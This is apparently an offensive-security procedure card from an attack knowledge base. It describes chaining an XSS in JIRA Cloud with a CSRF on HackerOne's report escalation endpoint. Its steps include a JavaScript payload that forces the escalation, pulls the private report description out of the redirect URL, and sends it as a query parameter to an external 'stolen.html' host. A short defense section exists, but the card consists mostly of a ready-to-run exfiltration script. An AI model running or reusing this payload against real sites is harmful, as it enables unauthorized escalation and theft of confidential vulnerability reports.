---
id: proc-003
tags:
  - xss
  - csrf
  - javascript
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:57.295Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Simulate-XSS-and-Trigger-CSRF-via-JavaScript

## Summary

This procedure uses JavaScript in the browser console to simulate XSS in JIRA Cloud, trigger the CSRF on HackerOne's escalation endpoint, and extract private report data from the resulting redirect URL.

## Description

The core of the attack involves injecting JavaScript that opens a popup window to the vulnerable GET endpoint https://hackerone.com/reports/[REPORT_NUMBER]/escalate, allowing unauthorized escalation. The script then waits, parses the redirect URL with regex to pull out the report description, closes the window, and redirects to a page displaying the stolen data. This chains the CSRF with XSS to bypass protections. The target is a web browser in the simulated JIRA context, with outcomes including data exfiltration.

## Requirements

1. Active session on HackerOne and loaded JIRA simulation page.
2. Known report ID ([REPORT_NUMBER]) for the target escalation.
3. Browser developer console open.

## Defense

Defensive measures and detection strategies:

- Protect CSRF-vulnerable endpoints with anti-CSRF tokens and require POST instead of GET.
- Implement XSS protections like output encoding and strict CSP in JIRA Cloud.
- Log and alert on unexpected escalations or popup window creations from authenticated sessions.

## Objectives

1. Simulate XSS to execute arbitrary JavaScript in JIRA context.
2. Forge the CSRF request to escalate reports without consent.
3. Collect and exfiltrate sensitive report details automatically.

## Instructions

### Step 1: Open Browser Console

**Context**: Access the JavaScript execution environment on the simulation page.

Right-click on the page, select 'Inspect', and switch to the Console tab.

> Expected output: Console panel opens, ready for script input.

### Step 2: Paste and Execute JavaScript

**Context**: Run the script to trigger the attack sequence.

Paste the following JavaScript code and press Enter:

```javascript
function XSRF() {
  var win = window.open('https://hackerone.com/reports/[id]/escalate', '_blank');
  setTimeout(function() {
    var url = win.location.href;
    var match = url.match(/description=([^&]+)/);
    if (match) {
      var desc = decodeURIComponent(match[1]);
      win.close();
      window.location.href = 'http://[redacted]/[redacted]/stolen.html?data=' + encodeURIComponent(desc);
    }
  }, 2000);
}
XSRF();
```

> This opens the escalation window, waits 2 seconds, extracts the description via regex, closes the window, and redirects with stolen data. Expected output: Automatic escalation and data capture; stolen description visible on redirect page.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[csrf]]
- [[JavaScript]]
- [[web]]
